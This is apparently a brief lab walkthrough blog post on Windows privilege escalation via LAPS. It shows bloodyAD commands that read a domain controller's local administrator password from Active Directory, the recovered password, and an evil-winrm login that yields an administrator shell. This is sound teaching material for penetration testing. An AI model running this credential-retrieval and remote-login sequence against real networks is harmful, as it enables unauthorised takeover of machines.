---
title: "Windows Privilege Escalation - LAPS"
date: 2025-04-03T22:41:10+05:30
draft: false
github_link: "https://github.com/gurusabarish/hugo-profile"
author: "Gurusabarish"
tags:
  - Placeholder text
  - Sample
  - example
image: /images/post.jpg
description: ""
toc: 
---

# Windows Privilege Escalation - LAPS

Local Administrator Password Solution (LAPS) is a feature in Windows used to backup Administrator password (What is LAPS?).

## Location LAPS file

```
dir "C:\Program Files\LAPS\CSE"
```

## Retrieve Administrator password

Using bloodyAD tool we can retrieve the password.

Installation: 

- git clone --depth 1 https://github.com/CravateRouge/autobloody
- pip install .

```
┌─[eu-dedivip-2]─[10.10.14.219]─[garrisec@htb-9ij5kp5ced]─[~/bloodyAD]
└──╼ [★]$ bloodyAD -u svc_deploy -d bloody.lab -p 'E3R$Q62^12p7PLlC%KWaxuaV' --host 10.129.207.26 get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

distinguishedName: CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
ms-Mcs-AdmPwd: 6af%4)3.!G!ghhi.T7[m[r3&
ms-Mcs-AdmPwdExpirationTime: 133875940421676222
```

## Login with password

```
┌─[eu-dedivip-2]─[10.10.14.219]─[garrisec@htb-9ij5kp5ced]─[~/bloodyAD]
└──╼ [★]$ evil-winrm -u Administrator -p '6af%4)3.!G!ghhi.T7[m[r3&' -i 10.129.207.26 -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```
